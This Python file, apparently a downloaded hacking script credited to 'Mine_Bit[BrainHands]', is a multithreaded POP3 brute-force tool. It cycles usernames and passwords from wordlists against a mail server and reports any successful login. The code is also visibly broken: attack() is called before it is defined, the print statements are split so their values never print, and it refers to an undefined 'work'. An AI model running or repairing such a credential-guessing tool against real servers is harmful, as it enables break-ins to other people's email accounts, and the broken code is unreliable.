# -*- coding: utf-8 -*-
# Coded by Mine_Bit[BrainHands]
# brainhands.ru
# mine_bit@brainhands.ru

import threading
import time
import random
import sys
import poplib
from copy import copy


def Start(server, userlist, wordlist):
    try:
        users = open(userlist, "r").readlines()
    except(IOError):
        print('Ошибка! Неправильный путь к файлу с именами пользователей!')  # "Error: Check your userlist path\n"

    try:
        words = open(wordlist, "r").readlines()
    except(IOError):
        print('Ошибка! проверьте путь к файлу с словарем!')  # "Error: Check your wordlist path\n
    try:
        pop = poplib.POP3(server)
        welcome = pop.getwelcome()
        pop.quit()

    except (poplib.error_proto):
        welcome = "No Response"
        pass
    print
    "[+] Server:", server
    print
    "[+] Users Loaded:", len(users)
    print
    "[+] Words Loaded:", len(words)
    print
    "[+] Server response:", welcome, "\n"

    wordlist = copy(words)


    attack()


    def reloader():
        for word in wordlist:
            words.append(word)


    def getword():
        lock = threading.Lock()
        lock.acquire()
        if len(words) != 0:
            value = random.sample(words, 1)
            words.remove(value[0])

        else:
            print
            "Reloading Wordlist - Changing User\n"
            reloader()
            value = random.sample(words, 1)
            users.remove(users[0])

        lock.release()
        return value[0][:-1], users[0][:-1]


    class Worker(threading.Thread):
        def run(self):
            value, user = getword()
            try:
                print
                "-" * 12
                print
                "User:", user, "Password:", value
                pop = poplib.POP3(sys.argv[1])
                pop.user(user)
                pop.pass_(value)
                print
                "\t\nLogin successful:", value, user
                print
                pop.stat()
                pop.quit()
                work.join()
                sys.exit(2)
            except (poplib.error_proto) as msg:
                print
                "An error occurred:", msg
                pass


    def attack():
        for i in range(len(words) * len(users)):
            work = Worker()
            work.start()
            time.sleep(1)
